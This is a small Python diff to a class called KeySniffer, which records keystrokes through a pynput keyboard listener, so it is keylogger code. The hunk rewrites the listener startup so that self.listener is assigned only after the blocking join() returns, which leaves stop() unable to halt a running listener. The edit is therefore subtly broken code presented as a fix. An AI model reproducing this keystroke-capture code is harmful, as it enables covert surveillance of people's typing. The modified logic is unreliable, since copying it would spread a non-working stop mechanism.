@@ -21,8 +21,9 @@ class KeySniffer:
     def __init__(self):
         self.log = Log()
     def start_listener(self):
-        with pynput.keyboard.Listener(on_press=self.on_press) as self.listener:
-            self.listener.join() # create the thread BUG FIXED
+        with pynput.keyboard.Listener(on_press=self.on_press) as l:
+            l.join()
+            self.listener = l
     def stop(self):
         if hasattr(self,"listener"):
             self.listener.stop()
